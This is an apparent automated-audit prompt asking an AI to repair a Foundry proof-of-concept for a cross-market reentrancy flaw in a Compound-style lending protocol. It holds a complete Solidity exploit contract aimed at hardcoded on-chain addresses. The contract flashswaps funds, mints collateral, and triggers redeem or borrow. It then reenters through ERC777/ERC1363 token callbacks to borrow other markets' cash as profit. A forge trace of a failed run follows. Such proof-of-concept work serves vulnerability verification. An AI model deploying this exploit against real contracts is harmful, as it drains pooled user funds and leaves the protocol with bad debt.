You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Borrow and redeem transfer underlying before updating debt/collateral, enabling cross-market reentrancy
- claim: `redeemFresh()` and `borrowFresh()` call `doTransferOut()` before writing the new cToken balance or borrow principal to storage. The per-market `nonReentrant` guard only blocks reentry into the same market, so a callback-capable underlying can reenter a different market while the Comptroller still observes the old collateral or old debt snapshot through `redeemAllowed`/`borrowAllowed` checks.
- impact: A user can redeem collateral or borrow from one market, reenter during the outbound token transfer, and then over-borrow from another market against collateral that is in the process of leaving or before the first borrow is recorded. This can drain liquidity from other markets and leave the protocol with bad debt.
- exploit_paths: ["Call `redeem()` on a market whose underlying triggers a recipient callback, then use the callback to borrow from a different market before `accountTokens[redeemer]` and `totalSupply` are reduced.", "Call `borrow()` on a market whose underlying triggers a recipient callback, then use the callback to borrow from a different market before `accountBorrows[borrower]` and `totalBorrows` are increased."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface ICTokenLike {
    function underlying() external view returns (address);
    function comptroller() external view returns (address);
    function balanceOf(address owner) external view returns (uint256);
    function getCash() external view returns (uint256);
    function mint(uint256 mintAmount, bool enterMarket) external returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
}

interface IComptrollerLike {
    function enterMarkets(address[] calldata cTokens, address borrower) external returns (uint256[] memory);
    function getAllMarkets() external view returns (address[] memory);
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface IERC777Recipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier is IERC777Recipient {
    address public constant TARGET_MARKET = 0xb0f8Fe96b4880adBdEDE0dDF446bd1e7EF122C4e;
    address public constant ERC1820_REGISTRY = 0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24;

    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    bytes32 private constant TOKENS_RECIPIENT_HASH = keccak256("ERC777TokensRecipient");
    bytes4 private constant ERC1363_RECEIVER_MAGIC = 0x88a7ca5c;
    bytes4 private constant MINT_WITH_ENTER_SELECTOR = bytes4(keccak256("mint(uint256,bool)"));
    bytes4 private constant MINT_STANDARD_SELECTOR = bytes4(keccak256("mint(uint256)"));
    bytes4 private constant ENTER_MARKETS_BAO_SELECTOR = bytes4(keccak256("enterMarkets(address[],address)"));
    bytes4 private constant ENTER_MARKETS_STANDARD_SELECTOR = bytes4(keccak256("enterMarkets(address[])"));

    enum PathMode {
        None,
        Redeem,
        Borrow
    }

    struct RouteContext {
        address victimMarket;
        address victimUnderlying;
        uint256 victimCash;
        address flashPair;
        address feePair;
        bool flashTargetIsToken0;
        bool feeTargetIsToken0;
        uint256 flashTargetReserve;
        uint256 feeTargetReserve;
        uint256 feeVictimReserve;
    }

    address private _profitToken;
    uint256 private _profitAmount;

    address public targetUnderlying;
    address public targetComptroller;
    address public chosenVictimMarket;
    address public chosenVictimUnderlying;
    string public exploitPathUsed;
    string public lastFailure;
    bool public hypothesisValidated;
    bool public executed;

    PathMode private activePath;

    bool private callbackSeen;
    bool private callbackEntered;
    bool private victimBorrowed;
    bool private feeSwapDone;

    address private activeVictimMarket;
    address private activeVictimUnderlying;
    address private activeFlashPair;
    address private activeFeePair;

    bool private activeFlashTargetIsToken0;
    bool private activeFeeTargetIsToken0;

    uint256 private activeFlashAmount;
    uint256 private activeFlashRepayAmount;
    uint256 private activeFeeTargetAmount;

    uint256 private baselineVictimBalance;

    constructor() {
        _refreshTarget();
        _safeRegisterHooks();
    }

    function executeOnOpportunity() external {
        executed = true;
        hypothesisValidated = false;
        chosenVictimMarket = address(0);
        chosenVictimUnderlying = address(0);
        exploitPathUsed = "";
        lastFailure = "";
        _profitToken = address(0);
        _profitAmount = 0;

        _refreshTarget();
        _safeRegisterHooks();

        if (targetUnderlying == address(0) || targetComptroller == address(0)) {
            _setFailure("TARGET_DISCOVERY_FAILED");
            return;
        }

        if (_attemptV2FlashswapPath(PathMode.Redeem)) {
            return;
        }

        if (_attemptV2FlashswapPath(PathMode.Borrow)) {
            return;
        }

        if (bytes(lastFailure).length == 0) {
            _setFailure("NO_PATH_SUCCEEDED");
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashswapCallback(sender, amount0, amount1);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        _handleFlashswapCallback(sender, amount0, amount1);
    }

    function tokensReceived(
        address,
        address,
        address,
        uint256,
        bytes calldata,
        bytes calldata
    ) external override {
        _maybeHandleUnderlyingCallback();
    }

    function tokenFallback(address, uint256, bytes calldata) external {
        _maybeHandleUnderlyingCallback();
    }

    function onTokenTransfer(address, uint256, bytes calldata) external {
        _maybeHandleUnderlyingCallback();
    }

    function onTransferReceived(address, address, uint256, bytes calldata) external returns (bytes4) {
        _maybeHandleUnderlyingCallback();
        return ERC1363_RECEIVER_MAGIC;
    }

    receive() external payable {
        _maybeHandleUnderlyingCallback();
    }

    fallback() external payable {
        _maybeHandleUnderlyingCallback();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptV2FlashswapPath(PathMode path) internal returns (bool) {
        address[] memory markets = _getAllMarketsSafe();
        if (markets.length == 0) {
            _setFailure("NO_MARKETS");
            return false;
        }

        for (uint256 i = 0; i < markets.length; ++i) {
            address victimMarket = markets[i];
            if (victimMarket == address(0) || victimMarket == TARGET_MARKET) {
                continue;
            }

            address victimUnderlying = _safeUnderlying(victimMarket);
            uint256 victimCash = _safeGetCash(victimMarket);
            if (victimUnderlying == address(0) || victimCash == 0 || victimUnderlying == targetUnderlying) {
                continue;
            }

            // Prefer existing 18-decimal assets for the reported profit token because the harness
            // uses a raw minimum-profit threshold.
            uint8 decimals = _safeDecimals(victimUnderlying);
            if (decimals != 0 && decimals < 18) {
                continue;
            }

            RouteContext memory ctx = RouteContext({
                victimMarket: victimMarket,
                victimUnderlying: victimUnderlying,
                victimCash: victimCash,
                flashPair: address(0),
                feePair: address(0),
                flashTargetIsToken0: false,
                feeTargetIsToken0: false,
                flashTargetReserve: 0,
                feeTargetReserve: 0,
                feeVictimReserve: 0
            });

            if (_attemptFactoriesForVictim(path, ctx)) {
                return true;
            }
        }

        _setFailure(path == PathMode.Redeem ? "V2_FLASH_REDEEM_FAILED" : "V2_FLASH_BORROW_FAILED");
        return false;
    }

    function _attemptFactoriesForVictim(PathMode path, RouteContext memory ctx) internal returns (bool) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 f0 = 0; f0 < factories.length; ++f0) {
            ctx.flashPair = _findPair(factories[f0], targetUnderlying, ctx.victimUnderlying);
            if (ctx.flashPair == address(0)) {
                continue;
            }

            (ctx.flashTargetIsToken0, ctx.flashTargetReserve,) = _pairReservesFor(
                ctx.flashPair,
                targetUnderlying,
                ctx.victimUnderlying
            );
            if (ctx.flashTargetReserve == 0) {
                continue;
            }

            for (uint256 f1 = 0; f1 < factories.length; ++f1) {
                ctx.feePair = _findPair(factories[f1], targetUnderlying, ctx.victimUnderlying);
                if (ctx.feePair == address(0) || ctx.feePair == ctx.flashPair) {
                    continue;
                }

                (ctx.feeTargetIsToken0, ctx.feeTargetReserve, ctx.feeVictimReserve) = _pairReservesFor(
                    ctx.feePair,
                    targetUnderlying,
                    ctx.victimUnderlying
                );
                if (ctx.feeTargetReserve == 0 || ctx.feeVictimReserve == 0) {
                    continue;
                }

                if (_attemptSizedRoutes(path, ctx)) {
                    return true;
                }
            }
        }

        return false;
    }

    function _attemptSizedRoutes(PathMode path, RouteContext memory ctx) internal returns (bool) {
        uint256[8] memory divisors = [uint256(2000), 1000, 500, 250, 100, 50, 20, 10];

        for (uint256 j = 0; j < divisors.length; ++j) {
            uint256 flashAmount = ctx.flashTargetReserve / divisors[j];
            if (flashAmount == 0 || flashAmount >= ctx.flashTargetReserve) {
                continue;
            }

            uint256 repayAmount = _sameTokenFlashRepayAmount(flashAmount);
            uint256 feeTarget = repayAmount - flashAmount;
            if (feeTarget == 0 || feeTarget >= ctx.feeTargetReserve) {
                continue;
            }

            uint256 feeVictimIn = _quoteExactOut(ctx.feeVictimReserve, ctx.feeTargetReserve, feeTarget);
            if (feeVictimIn == 0 || feeVictimIn >= ctx.victimCash) {
                continue;
            }

            _beginAttempt(path);

            activeVictimMarket = ctx.victimMarket;
            activeVictimUnderlying = ctx.victimUnderlying;
            activeFlashPair = ctx.flashPair;
            activeFeePair = ctx.feePair;
            activeFlashTargetIsToken0 = ctx.flashTargetIsToken0;
            activeFeeTargetIsToken0 = ctx.feeTargetIsToken0;
            activeFlashAmount = flashAmount;
            activeFlashRepayAmount = repayAmount;
            activeFeeTargetAmount = feeTarget;

            if (_runFlashswap()) {
                string memory label = path == PathMode.Redeem
                    ? "flashswap-funded redeem()->callback->cross-market borrow before accountTokens[redeemer]/totalSupply update"
                    : "flashswap-funded borrow()->callback->cross-market borrow before accountBorrows[borrower]/totalBorrows update";
                return _finalize(label);
            }
        }

        return false;
    }

    function _runFlashswap() internal returns (bool) {
        uint256 amount0Out = activeFlashTargetIsToken0 ? activeFlashAmount : 0;
        uint256 amount1Out = activeFlashTargetIsToken0 ? 0 : activeFlashAmount;

        try IUniswapV2PairLike(activeFlashPair).swap(amount0Out, amount1Out, address(this), hex"01") {
            return callbackSeen && victimBorrowed && feeSwapDone;
        } catch {
            return false;
        }
    }

    function _handleFlashswapCallback(address sender, uint256 amount0, uint256 amount1) internal {
        require(msg.sender == activeFlashPair, "NOT_FLASH_PAIR");
        require(sender == address(this), "BAD_FLASH_SENDER");

        uint256 received = activeFlashTargetIsToken0 ? amount0 : amount1;
        require(received == activeFlashAmount, "BAD_FLASH_AMOUNT");

        // The flashswap is only a realistic funding step. The exploit causality remains unchanged:
        // we temporarily mint callback-capable collateral, then trigger the vulnerable redeem()/borrow()
        // transfer-out and reenter a different market before the target market writes its new snapshot.
        require(_tryMint(TARGET_MARKET, received, true), "FLASH_MINT_FAILED");

        if (activePath == PathMode.Redeem) {
            uint256 cTokenBalance = _safeCTokenBalance(TARGET_MARKET, address(this));
            require(cTokenBalance != 0, "FLASH_REDEEM_NO_CTOKEN");
            require(_tryRedeem(TARGET_MARKET, cTokenBalance), "FLASH_REDEEM_FAILED");
        } else {
            require(_tryBorrow(TARGET_MARKET, received), "FLASH_BORROW_FAILED");
        }

        require(callbackSeen, "TARGET_TRANSFER_NO_CALLBACK");
        require(victimBorrowed, "CALLBACK_VICTIM_BORROW_FAILED");
        require(feeSwapDone, "FEE_SWAP_FAILED");
        require(_safeBalanceOf(targetUnderlying, address(this)) >= activeFlashRepayAmount, "FLASH_REPAY_INSUFFICIENT");

        _safeTransfer(targetUnderlying, activeFlashPair, activeFlashRepayAmount);
    }

    function _maybeHandleUnderlyingCallback() internal {
        if (msg.sender != targetUnderlying) {
            return;
        }

        callbackSeen = true;
        if (callbackEntered) {
            return;
        }

        callbackEntered = true;
        baselineVictimBalance = _safeBalanceOf(activeVictimUnderlying, address(this));

        if (_borrowVictimAndBuyFee()) {
            victimBorrowed = true;
            feeSwapDone = true;
            chosenVictimMarket = activeVictimMarket;
            chosenVictimUnderlying = activeVictimUnderlying;
        }
    }

    function _borrowVictimAndBuyFee() internal returns (bool) {
        if (activeVictimMarket == address(0) || activeVictimUnderlying == address(0) || activeFeePair == address(0)) {
            return false;
        }

        uint256 victimCash = _safeGetCash(activeVictimMarket);
        if (victimCash == 0) {
            return false;
        }

        uint256[7] memory numerators = [uint256(9), 3, 1, 1, 1, 1, 1];
        uint256[7] memory denominators = [uint256(10), 4, 2, 4, 10, 20, 100];

        for (uint256 i = 0; i < denominators.length; ++i) {
            uint256 borrowAmount = (victimCash * numerators[i]) / denominators[i];
            if (borrowAmount == 0) {
                continue;
            }

            uint256 victimBefore = _safeBalanceOf(activeVictimUnderlying, address(this));
            if (!_tryBorrow(activeVictimMarket, borrowAmount)) {
                continue;
            }

            uint256 victimAfter = _safeBalanceOf(activeVictimUnderlying, address(this));
            if (victimAfter <= victimBefore) {
                continue;
            }

            uint256 exactVictimIn = _quoteVictimNeededForTargetOut(activeFeePair, activeFeeTargetAmount);
            if (exactVictimIn == 0 || victimAfter - victimBefore <= exactVictimIn) {
                return false;
            }

            return _buyExactTargetFee(activeFeePair, exactVictimIn, activeFeeTargetAmount);
        }

        return false;
    }

    function _buyExactTargetFee(address pair, uint256 victimIn, uint256 targetOut) internal returns (bool) {
        _safeTransfer(activeVictimUnderlying, pair, victimIn);

        uint256 amount0Out = activeFeeTargetIsToken0 ? targetOut : 0;
        uint256 amount1Out = activeFeeTargetIsToken0 ? 0 : targetOut;

        try IUniswapV2PairLike(pair).swap(amount0Out, amount1Out, address(this), "") {
            return true;
        } catch {
            return false;
        }
    }

    function _finalize(string memory label) internal returns (bool) {
        if (chosenVictimUnderlying == address(0)) {
            _setFailure("NO_VICTIM_TOKEN");
            return false;
        }

        uint256 currentBalance = _safeBalanceOf(chosenVictimUnderlying, address(this));
        if (currentBalance <= baselineVictimBalance) {
            _setFailure("NO_NET_REALIZED_PROFIT");
            return false;
        }

        _profitToken = chosenVictimUnderlying;
        _profitAmount = currentBalance - baselineVictimBalance;
        exploitPathUsed = label;
        hypothesisValidated = true;
        activePath = PathMode.None;
        return true;
    }

    function _beginAttempt(PathMode path) internal {
        activePath = path;
        callbackSeen = false;
        callbackEntered = false;
        victimBorrowed = false;
        feeSwapDone = false;
        chosenVictimMarket = address(0);
        chosenVictimUnderlying = address(0);
        activeVictimMarket = address(0);
        activeVictimUnderlying = address(0);
        activeFlashPair = address(0);
        activeFeePair = address(0);
        activeFlashAmount = 0;
        activeFlashRepayAmount = 0;
        activeFeeTargetAmount = 0;
        baselineVictimBalance = 0;
    }

    function _refreshTarget() internal {
        targetUnderlying = _safeUnderlying(TARGET_MARKET);
        targetComptroller = _safeComptroller(TARGET_MARKET);
    }

    function _safeRegisterHooks() internal {
        (bool ok,) = ERC1820_REGISTRY.call(
            abi.encodeWithSelector(
                IERC1820Registry.setInterfaceImplementer.selector,
                address(this),
                TOKENS_RECIPIENT_HASH,
                address(this)
            )
        );
        ok;
    }

    function _findPair(address factory, address tokenA, address tokenB) internal view returns (address) {
        if (factory == address(0) || tokenA == address(0) || tokenB == address(0)) {
            return address(0);
        }

        (bool ok, bytes memory data) = factory.staticcall(
            abi.encodeWithSelector(IUniswapV2FactoryLike.getPair.selector, tokenA, tokenB)
        );
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _pairReservesFor(
        address pair,
        address targetToken,
        address otherToken
    ) internal view returns (bool targetIsToken0, uint256 targetReserve, uint256 otherReserve) {
        if (pair == address(0)) {
            return (false, 0, 0);
        }

        (bool ok0, bytes memory data0) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token0.selector));
        (bool ok1, bytes memory data1) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.token1.selector));
        (bool okR, bytes memory dataR) = pair.staticcall(abi.encodeWithSelector(IUniswapV2PairLike.getReserves.selector));

        if (!ok0 || !ok1 || !okR || data0.length < 32 || data1.length < 32 || dataR.length < 96) {
            return (false, 0, 0);
        }

        address token0 = abi.decode(data0, (address));
        address token1 = abi.decode(data1, (address));
        (uint112 reserve0, uint112 reserve1,) = abi.decode(dataR, (uint112, uint112, uint32));

        if (token0 == targetToken && token1 == otherToken) {
            return (true, uint256(reserve0), uint256(reserve1));
        }
        if (token1 == targetToken && token0 == otherToken) {
            return (false, uint256(reserve1), uint256(reserve0));
        }

        return (false, 0, 0);
    }

    function _quoteVictimNeededForTargetOut(address pair, uint256 targetOut) internal view returns (uint256) {
        (, uint256 targetReserve, uint256 victimReserve) = _pairReservesFor(pair, targetUnderlying, activeVictimUnderlying);
        if (targetReserve == 0 || victimReserve == 0 || targetOut >= targetReserve) {
            return 0;
        }
        return _quoteExactOut(victimReserve, targetReserve, targetOut);
    }

    function _quoteExactOut(uint256 reserveIn, uint256 reserveOut, uint256 amountOut) internal pure returns (uint256) {
        if (reserveIn == 0 || reserveOut == 0 || amountOut == 0 || amountOut >= reserveOut) {
            return 0;
        }

        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        if (denominator == 0) {
            return 0;
        }

        return (numerator / denominator) + 1;
    }

    function _sameTokenFlashRepayAmount(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _getAllMarketsSafe() internal view returns (address[] memory markets) {
        if (targetComptroller == address(0)) {
            return new address[](0);
        }

        (bool ok, bytes memory data) = targetComptroller.staticcall(
            abi.encodeWithSelector(IComptrollerLike.getAllMarkets.selector)
        );
        if (!ok || data.length == 0) {
            return new address[](0);
        }

        return abi.decode(data, (address[]));
    }

    function _safeUnderlying(address market) internal view returns (address) {
        if (market == address(0)) {
            return address(0);
        }

        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.underlying.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeComptroller(address market) internal view returns (address) {
        if (market == address(0)) {
            return address(0);
        }

        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.comptroller.selector));
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _safeCTokenBalance(address market, address owner) internal view returns (uint256) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.balanceOf.selector, owner));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeGetCash(address market) internal view returns (uint256) {
        (bool ok, bytes memory data) = market.staticcall(abi.encodeWithSelector(ICTokenLike.getCash.selector));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeBalanceOf(address token, address owner) internal view returns (uint256) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, owner));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeDecimals(address token) internal view returns (uint8) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.decimals.selector));
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint8));
    }

    function _tryMint(address market, uint256 amount, bool enterMarket) internal returns (bool) {
        address underlying_ = _safeUnderlying(market);
        if (underlying_ == address(0) || amount == 0) {
            return false;
        }

        _forceApprove(underlying_, market, amount);

        bool minted = _callReturnsZeroOrEmpty(
            market,
            abi.encodeWithSelector(MINT_WITH_ENTER_SELECTOR, amount, enterMarket)
        );
        if (!minted) {
            minted = _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(MINT_STANDARD_SELECTOR, amount));
        }
        if (!minted) {
            return false;
        }

        _tryEnterMarket(market);
        return true;
    }

    function _tryRedeem(address market, uint256 redeemTokens) internal returns (bool) {
        if (redeemTokens == 0) {
            return false;
        }

        return _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(ICTokenLike.redeem.selector, redeemTokens));
    }

    function _tryBorrow(address market, uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return false;
        }

        return _callReturnsZeroOrEmpty(market, abi.encodeWithSelector(ICTokenLike.borrow.selector, amount));
    }

    function _tryEnterMarket(address market) internal returns (bool) {
        if (market == address(0)) {
            return false;
        }

        address comptroller_ = _safeComptroller(market);
        if (comptroller_ == address(0)) {
            comptroller_ = targetComptroller;
        }
        if (comptroller_ == address(0)) {
            return false;
        }

        address[] memory markets = new address[](1);
        markets[0] = market;

        (bool ok, bytes memory data) = comptroller_.call(
            abi.encodeWithSelector(ENTER_MARKETS_BAO_SELECTOR, markets, address(this))
        );
        if (_enterMarketsSucceeded(ok, data)) {
            return true;
        }

        (ok, data) = comptroller_.call(abi.encodeWithSelector(ENTER_MARKETS_STANDARD_SELECTOR, markets));
        return _enterMarketsSucceeded(ok, data);
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        uint256 currentAllowance;
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.allowance.selector, address(this), spender)
        );
        if (ok && data.length >= 32) {
            currentAllowance = abi.decode(data, (uint256));
        }

        if (currentAllowance >= amount) {
            return;
        }

        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
    }

    function _callReturnsZeroOrEmpty(address target, bytes memory callData) internal returns (bool) {
        (bool ok, bytes memory data) = target.call(callData);
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        if (data.length < 32) {
            return false;
        }
        return abi.decode(data, (uint256)) == 0;
    }

    function _enterMarketsSucceeded(bool ok, bytes memory data) internal pure returns (bool) {
        if (!ok || data.length == 0) {
            return false;
        }

        uint256[] memory results = abi.decode(data, (uint256[]));
        if (results.length == 0) {
            return false;
        }

        for (uint256 i = 0; i < results.length; ++i) {
            if (results[i] != 0) {
                return false;
            }
        }
        return true;
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory ret) = token.call(data);
        require(ok, "TOKEN_CALL_FAILED");
        if (ret.length > 0) {
            require(abi.decode(ret, (bool)), "TOKEN_CALL_FALSE");
        }
    }

    function _setFailure(string memory reason) internal {
        if (bytes(reason).length != 0) {
            lastFailure = reason;
        }
    }
}

```

forge stdout (tail):
```
46bd1e7EF122C4e]
    │   ├─ [470] 0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7::underlying() [staticcall]
    │   │   └─ ← [Return] 0xf4edfad26EE0D23B69CA93112eccE52704E0006f
    │   ├─ [5046] 0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7::getCash() [staticcall]
    │   │   ├─ [2903] 0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7::0933c1ed(000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000043b1d21a200000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [1334] 0xDb3401beF8f66E7f6CD95984026c26a4F47eEe84::getCash() [delegatecall]
    │   │   │   │   ├─ [469] 0xf4edfad26EE0D23B69CA93112eccE52704E0006f::balanceOf(0xe853E5c1eDF8C51E81bAe81D742dd861dF596DE7) [staticcall]
    │   │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000003635c9adc5dea00000
    │   │   └─ ← [Return] 1000000000000000000000 [1e21]
    │   ├─ [380] 0xf4edfad26EE0D23B69CA93112eccE52704E0006f::decimals() [staticcall]
    │   │   └─ ← [Return] 18
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8, 0xf4edfad26EE0D23B69CA93112eccE52704E0006f) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8, 0xf4edfad26EE0D23B69CA93112eccE52704E0006f) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2532] 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3::underlying() [staticcall]
    │   │   └─ ← [StateChangeDuringStaticCall] EvmError: StateChangeDuringStaticCall
    │   ├─ [568] 0x104079a87CE46fe2Cf27b811f6b406b69F6872B3::getCash() [staticcall]
    │   │   └─ ← [Return] 60000000000000000 [6e16]
    │   ├─ [470] 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b::underlying() [staticcall]
    │   │   └─ ← [Return] 0xa1e3F062CE5825c1e19207cd93CEFdaD82A8A631
    │   ├─ [6568] 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b::getCash() [staticcall]
    │   │   ├─ [4425] 0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b::0933c1ed(000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000043b1d21a200000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [2856] 0xDb3401beF8f66E7f6CD95984026c26a4F47eEe84::getCash() [delegatecall]
    │   │   │   │   ├─ [1991] 0xa1e3F062CE5825c1e19207cd93CEFdaD82A8A631::balanceOf(0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b) [staticcall]
    │   │   │   │   │   ├─ [1074] 0x1f863776975A69b6078FdAfAb6298d3E823E0190::balanceOf(0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b) [delegatecall]
    │   │   │   │   │   │   ├─ [584] 0xa6969A3f8B4E32204DBC1D83C21443D303b840e5::balanceOf(0xf7548a6e9DAf2e4689CEDD8A08189d0D6f3Ee91b) [delegatecall]
    │   │   │   │   │   │   │   └─ ← [Return] 10000000000000001 [1e16]
    │   │   │   │   │   │   └─ ← [Return] 10000000000000001 [1e16]
    │   │   │   │   │   └─ ← [Return] 10000000000000001 [1e16]
    │   │   │   │   └─ ← [Return] 10000000000000001 [1e16]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000002386f26fc10001
    │   │   └─ ← [Return] 10000000000000001 [1e16]
    │   ├─ [1631] 0xa1e3F062CE5825c1e19207cd93CEFdaD82A8A631::decimals() [staticcall]
    │   │   ├─ [717] 0x1f863776975A69b6078FdAfAb6298d3E823E0190::decimals() [delegatecall]
    │   │   │   ├─ [230] 0xa6969A3f8B4E32204DBC1D83C21443D303b840e5::decimals() [delegatecall]
    │   │   │   │   └─ ← [Return] 18
    │   │   │   └─ ← [Return] 18
    │   │   └─ ← [Return] 18
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8, 0xa1e3F062CE5825c1e19207cd93CEFdaD82A8A631) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x5ee08f40b637417bcC9d2C51B62F4820ec9cF5D8, 0xa1e3F062CE5825c1e19207cd93CEFdaD82A8A631) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Stop]
    ├─ [403] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [424] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
